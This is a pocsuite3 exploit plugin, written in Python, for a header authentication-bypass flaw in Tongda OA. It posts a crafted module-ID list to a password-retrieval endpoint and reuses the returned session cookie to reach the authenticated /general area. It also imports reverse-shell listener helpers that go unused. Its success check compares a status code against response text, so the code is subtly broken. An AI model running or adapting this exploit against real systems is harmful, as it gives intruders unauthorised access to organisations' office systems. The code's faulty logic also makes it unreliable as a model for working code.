# _*_ coding:utf-8 _*_
# @Time : 2023/12/12
# @Author: 炼金术师诸葛亮
from pocsuite3.api import Output, POCBase, register_poc, requests, logger
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import REVERSE_PAYLOAD, random_str

class tongdaOA_Authenticatio_bypass(POCBase):
    pocDesc = '''通达OA header身份认证绕过漏洞'''
    author = '炼金术师诸葛亮'
    createDate = '2023-12-12'
    name = '通达OA header身份认证绕过漏洞'



    def _verify(self):

        result = {}
        url = self.url+ '/module/retrieve_pwd/header.inc.php'
        check_url=self.url+ '/general'
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
            "Accept": "text/html.application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
            'Accept-Encoding': 'gzip, deflate,br',
            'Accept-Language': 'zh-CN.zh:g=0.9',
            'Cache-Control': 'no-cache',
            'Upgrade-Insecure-Requests': '1',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Pragma': 'no-cache'
        }
        try:
            data = '6,67,13,14,40,41,44,75,27,60,61,481,482,483,484,485,486,487,488,489,490,491,492,120,494,495,496,497,498,499,500,501,502,503,505,504,26,506,507,508,515,537,122,123,124,628,125,630,631,632,633,55,514,509,29,28,129,510,511,224,39,512,513,252,230,231,232,629,233,234,461,462,463,464,465,466,467,468,469,470,471,472,473,474,475,200,202,201,203,204,205,206,207,208,209,65,187,186,188,189,190,191,606,192,193,221,550,551,73,62,63,34,532,548,640,641,642,549,601,600,602,603,604,46,21,22,227,56,30,31,33,32,605,57,609,103,146,107,197,228,58,538,151,6,534,69,71,72,223,639,'


            response = requests.post(url, headers=headers,data=data)
            if response.status_code == 200:
                set_cookie_headers = response.headers.get('Set-Cookie')
                headers2={
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
                    'Accept-Encoding': 'gzip, deflate',
                    'DNT': '1',
                    'Connection': 'close',
                    'Accept-Language': 'zh-CN,zh;g-0,8.en-US;g-0.5,en;g=0.3',
                    'Upgrade-Insecure-Requests': '1',
                    'Cookie': set_cookie_headers
                }
                r=requests.get(check_url,headers=headers2)
                if r.status_code ==200 in r.text:
                    result['VerifyInfo'] = {}


            return self.parse_output(result)
        except Exception as e:
            pass

register_poc(tongdaOA_Authenticatio_bypass)